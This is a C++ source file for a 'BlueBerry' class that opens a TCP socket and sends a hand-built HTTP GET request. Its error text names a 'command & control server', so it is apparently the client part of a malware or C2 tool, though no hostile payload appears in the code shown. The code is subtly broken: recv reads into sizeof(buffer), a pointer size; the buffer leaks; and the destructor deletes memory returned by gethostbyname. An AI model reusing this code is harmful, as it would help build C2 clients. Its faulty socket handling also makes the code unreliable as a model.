#include "../include/BlueBerry.hpp"
#include <cstring>
#include <stdexcept>
#include <cstdlib>
#include <iostream>


// UTILITIES
bool BlueBerry::establishConnection()
{
    this->server = gethostbyname(this->getHost().c_str());
    if (!server)
    {
        std::cout << "Cannot resolve hostname. Connection establishing failed.\n";
        this->closeSocket();
        return false;
    }

    bzero((char *) &this->servAddr, sizeof(this->servAddr));
    this->servAddr.sin_family = AF_INET;
    this->servAddr.sin_port = htons(std::stoi(port));
    bcopy((char *)server->h_addr, (char *) &this->servAddr.sin_addr.s_addr, server->h_length);

    if (connect(this->socketDescriptor, (struct sockaddr *) &this->servAddr, sizeof(this->servAddr)) < 0)
    {
        std::cout << "Connection failed.\n";
        this->closeSocket();
        return false;
    }

    return true;
}

std::string BlueBerry::performGETReq()
{
    std::string request = "GET " + this->getResource() + this->getQueryParams() + " HTTP/1.1\r\nHost: " + this->getHost() + "\r\nConnection: close\r\n\r\n";

    if (send(this->getSocketDescriptor(), request.c_str(), request.size(), 0) < 0)
    {
        std::cout << "failed to send request..." << std::endl;
        this->closeSocket();
        return "";
    }
    std::cout << request << std::endl;
    int n;
    std::string rawSite;
    char *buffer = new char[this->getBufferSize()];
    while ((n = recv(this->getSocketDescriptor(), buffer, sizeof(buffer), 0)) > 0)  
        rawSite.append(buffer, n);

    this->closeSocket();
    return rawSite;
}

void BlueBerry::closeSocket()
{   close(this->getSocketDescriptor());     }


// SETTERS
void BlueBerry::setSocket()
{   this->socketDescriptor = socket(AF_INET, SOCK_STREAM, 0);   }

void BlueBerry::setServerAddress(struct sockaddr_in addr)
{   this->servAddr = addr;    }

void BlueBerry::setHost(std::string hs)
{   this->host = hs;     }

void BlueBerry::setPort(std::string prt)
{   this->port = prt;     }

void BlueBerry::setResource(std::string res)
{   this->resource = res;   }

void BlueBerry::setQueryParams(std::string qp)
{   this->queryParams = qp;   }

void BlueBerry::setBufferSize(unsigned short int s)
{   this->bufferSize = s;   }


// GETTERS
int BlueBerry::getSocketDescriptor()
{   return this->socketDescriptor;  }

struct sockaddr_in BlueBerry::getServerAddress()
{   return this->servAddr;}

std::string BlueBerry::getHost()
{   return this->host;    }

std::string BlueBerry::getPort()
{   return this->port;     }

std::string BlueBerry::getResource()
{   return this->resource;   }

std::string BlueBerry::getQueryParams()
{   return this->queryParams;   }

unsigned short int BlueBerry::getBufferSize()
{   return this->bufferSize;    }


// CONSTRUCTOR & DISTRUCTOR
BlueBerry::BlueBerry(struct sockaddr_in addr, std::string host, std::string port, 
                    std::string resource, std::string queryParams)
{
    try 
    {
        this->setSocket();
        this->setServerAddress(addr);
        this->setHost(host);
        this->setPort(port);
        this->setResource(resource);
        this->setQueryParams(queryParams);
        this->setBufferSize(255); 
    } catch (std::exception &e)
    {
        std::cerr << "Failed to establish a connection to command & control server.\n";
        exit(1);
    }
}

BlueBerry::~BlueBerry()
{
    delete this->server;
}